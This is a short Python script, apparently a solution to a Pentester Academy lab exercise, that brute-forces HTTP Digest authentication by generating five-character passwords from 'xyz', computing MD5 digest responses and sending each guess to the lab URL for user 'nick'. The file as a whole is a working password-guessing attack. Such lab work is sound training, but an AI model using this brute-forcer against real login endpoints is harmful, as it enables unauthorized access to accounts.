import hashlib
import itertools
import requests



def passlist(characters, length):
    list_password=[];
    for i in itertools.product(characters,repeat=length):
        list_password.append("".join(i))
    return list_password


def hack_digest(username):
    '''
    :param username:
    :return:
    '''
    password = passlist('xyz',5)
    print('Password list has been generated!!')
    url='http://pentesteracademylab.appspot.com/lab/webapp/digest2/1'
    url_resource='/lab/webapp/digest2/1'

    Realm='Pentester Academy'
    req = requests.get(url)
    nonce=req.headers.get('www-authenticate').split('"')[3]
    print('Computing the hash1 and hash2')

    for pw in password:
        hash1_str = (username+':'+Realm+':'+pw.strip()).encode('utf-8')
        hash2_str = ('GET:'+url_resource).encode('utf-8')

        hash1 = hashlib.md5(hash1_str).hexdigest()
        hash2 = hashlib.md5(hash2_str).hexdigest()
        response_string = (hash1+':'+nonce+':'+hash2).encode('utf-8')


        response = hashlib.md5(response_string).hexdigest()

        headers = {
            'Authorization':'Digest usernmae="'+username+'"'+', realm="Pentester Academy", nonce="'+nonce+ '", uri="/lab/webapp/digest2/1",'+' response="'+response+'"'
        }

        req = requests.get(url,headers=headers)

        if req.status_code ==401:
            print("Failed username: "+username,"Password is :"+pw)
        elif req.status_code == 200:
            print("==========Passed===========username: "+username,"Password is :"+pw)
        else:
            print('Unexpected!!!')

hack_digest('nick')


'''
Authorization: Digest username="admin", realm="Pentester Academy", nonce="'+nonce+'", uri="/lab/webapp/digest2/1", response="ae79760cba413b5828d76f899f162676"
'''
